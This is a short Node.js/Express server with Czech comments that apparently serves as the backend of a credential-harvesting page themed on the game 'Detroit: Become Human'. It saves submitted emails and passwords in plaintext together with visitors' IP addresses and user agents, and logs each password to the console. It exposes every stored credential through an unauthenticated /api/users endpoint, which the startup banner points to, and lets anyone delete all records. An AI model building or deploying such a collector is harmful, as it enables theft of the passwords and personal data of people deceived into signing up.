const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

// MIDDLEWARE
app.use(express.json());
app.use(cors());

// STATICKE SOUBORY (frontend)
app.use(express.static(path.join(__dirname, 'public')));

// DATABAZE
const db = new sqlite3.Database(path.join(__dirname, 'database.db'), (err) => {
    if (err) {
        console.error('Chyba databaze:', err);
    } else {
        console.log('Databaze pripojena');
    }
});

// Vytvoreni tabulky
db.serialize(() => {
    db.run(`
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            password TEXT NOT NULL,
            username TEXT,
            ip_address TEXT,
            user_agent TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `, (err) => {
        if (err) {
            console.error('Chyba pri vytvareni tabulky:', err);
        } else {
            console.log('Tabulka users pripravena');
        }
    });
});

// REGISTRACE (uklada nove udaje)
app.post('/api/register', (req, res) => {
    const { email, password, username } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    if (!email || !password) {
        return res.status(400).json({ 
            success: false, 
            error: 'Email a heslo jsou povinne' 
        });
    }

    db.run(
        'INSERT INTO users (email, password, username, ip_address, user_agent) VALUES (?, ?, ?, ?, ?)',
        [email, password, username || email, ip, userAgent],
        function(err) {
            if (err) {
                console.error('Chyba:', err);
                return res.status(500).json({ 
                    success: false, 
                    error: 'Chyba databaze' 
                });
            }

            console.log(`[NOVY UZIVATEL] Email: ${email} | Heslo: ${password}`);
            res.json({ 
                success: true,
                message: 'Registrace uspesna!',
                userId: this.lastID 
            });
        }
    );
});

// ZISKANI VSECH UZIVATELU
app.get('/api/users', (req, res) => {
    db.all('SELECT id, email, password, ip_address, user_agent, created_at FROM users ORDER BY created_at DESC', (err, rows) => {
        if (err) {
            return res.status(500).json({ 
                success: false, 
                error: 'Chyba databaze' 
            });
        }

        res.json({ 
            success: true,
            users: rows,
            count: rows.length 
        });
    });
});

// SMAZANI VSECH DAT
app.delete('/api/users', (req, res) => {
    db.run('DELETE FROM users', (err) => {
        if (err) {
            return res.status(500).json({ success: false, error: 'Chyba' });
        }
        res.json({ success: true, message: 'Vsechna data smazana' });
    });
});

// HLAVNI STRANKA - posle index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// SPUSTENI SERVERU
app.listen(PORT, '0.0.0.0', () => {
    console.log('');
    console.log('========================================');
    console.log('  Detroit: Become Human');
    console.log('  http://localhost:' + PORT);
    console.log('  Udaje: /api/users');
    console.log('========================================');
    console.log('');
});
